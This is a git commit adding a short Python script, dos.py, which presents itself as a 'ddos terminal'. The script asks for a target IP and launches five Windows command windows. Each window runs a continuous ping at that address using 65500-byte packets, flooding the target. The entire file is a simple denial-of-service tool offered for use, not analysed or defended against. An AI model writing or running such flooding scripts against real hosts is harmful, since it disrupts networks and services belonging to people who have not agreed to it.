a64c18d369e17f8333558a4076035e82800c679c
xcheif <xabi.felix@glc.vic.edu.au>
2025-05-13 13:07:31 +1000

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,13 @@
+import os
+import time
+print('welcome to ddos terminal enter targer ip adress')
+input('click enter to continue')
+
+ip = input('enter the target local ip')
+cmd = f"ping {ip} -t -l 65500"
+
+for i in range(5):
+    os.system(f'start cmd /k"color 0A && {cmd}"')
+    time.sleep(0.2)
+    
+    
